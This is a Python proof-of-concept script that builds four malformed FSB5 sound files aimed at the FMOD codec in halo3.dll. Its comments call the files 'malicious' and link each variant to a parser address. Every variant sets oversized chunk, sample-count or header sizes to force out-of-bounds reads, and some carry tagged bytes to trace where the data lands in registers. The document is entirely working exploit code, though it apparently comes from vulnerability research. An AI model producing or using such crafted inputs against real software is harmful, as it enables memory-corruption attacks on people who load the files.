#!/usr/bin/env python3
# Craft malicious FSB5 files that drive specific control paths in halo3.dll's
# FMOD FSB codec. Writes PoC files to the given dir.
import struct, sys, os

def hdr(numSamples, sampleHeadersSize, nameTableSize, dataSize, mode=0xf, f1c=1, f20=0, version=1):
    h = bytearray(0x3c)
    h[0:4] = b"FSB5"
    struct.pack_into("<I", h, 0x04, version)
    struct.pack_into("<I", h, 0x08, numSamples)
    struct.pack_into("<I", h, 0x0c, sampleHeadersSize)
    struct.pack_into("<I", h, 0x10, nameTableSize)
    struct.pack_into("<I", h, 0x14, dataSize)
    struct.pack_into("<I", h, 0x18, mode)
    struct.pack_into("<I", h, 0x1c, f1c)
    struct.pack_into("<I", h, 0x20, f20)
    return h

def chunk(ctype, size, more):
    # dword = (type<<25) | (size<<1) | more
    return struct.pack("<I", ((ctype & 0x7f) << 25) | ((size & 0xffffff) << 1) | (more & 1))

def sample_base(freq_code=4, chans=1, dataoff=0, has_chunks=1):
    # FSB5 8-byte sample base entry. bit0 = has_chunks (extra params follow).
    # rest encodes frequency index / channels / data offset (layout approx; the
    # parser only needs bit0 here). We tag the upper bytes so provenance is clear.
    v = has_chunks & 1
    v |= (chans & 1) << 1
    v |= (freq_code & 0xf) << 5
    v |= (dataoff & 0x3ffffff) << 7
    return struct.pack("<Q", v)

OUT = sys.argv[1] if len(sys.argv) > 1 else "."
os.makedirs(OUT, exist_ok=True)

def write(name, data):
    p = os.path.join(OUT, name)
    open(p, "wb").write(data)
    print("wrote %-28s %d bytes" % (name, len(data)))

# ---- V1: chunk-walk OOB read. One sample; a non-{6,9,0xb} chunk type with a
#         huge 24-bit size and more=1, so 0x4ea400 does rax += size then reads
#         [rax] far out of the blob. The size (0x7fffff) is the controlled offset.
blob = bytearray()
blob += sample_base(has_chunks=1)
blob += chunk(ctype=4, size=0x7fffff, more=1)   # skip 0x7fffff bytes, keep walking
blob += chunk(ctype=4, size=0x7fffff, more=1)
blob += chunk(ctype=4, size=0x7fffff, more=0)
sh = len(blob)
write("poc_v1_chunkwalk_oob.fsb", bytes(hdr(1, sh, 0, 0)) + bytes(blob))

# ---- V2: numSamples far larger than the blob. 0x4e92e0 walks the blob once per
#         sample; with a tiny blob and huge count, r10 runs past the allocation.
blob = bytearray()
blob += sample_base(has_chunks=0)   # minimal, no chunks
sh = len(blob)
write("poc_v2_numsamples_oob.fsb", bytes(hdr(0x7fffffff, sh, 0, 0)) + bytes(blob))

# ---- V3: a type-6 chunk (accepted) whose size is huge; caller reads *out and
#         processes `size` bytes. Tag the chunk data so we see it land in regs.
blob = bytearray()
blob += sample_base(has_chunks=1)
blob += chunk(ctype=6, size=0xffffff, more=0)   # type 6 => accepted, size huge
blob += b"\x41\x42\x43\x44\x45\x46\x47\x48" * 4  # tagged chunk data
sh = len(blob)
write("poc_v3_type6_bigsize.fsb", bytes(hdr(1, sh, 0, 0)) + bytes(blob))

# ---- V4: sampleHeadersSize huge but file short -> read helper over-reads /
#         offset table sizing (numSamples*4) vs blob mismatch.
blob = bytearray()
blob += sample_base(has_chunks=1)
blob += chunk(ctype=6, size=8, more=0)
blob += b"\x51\x52\x53\x54\x55\x56\x57\x58"
write("poc_v4_shsize_huge.fsb", bytes(hdr(4, 0x7ffffff0, 0, 0)) + bytes(blob) + bytes(0x200))
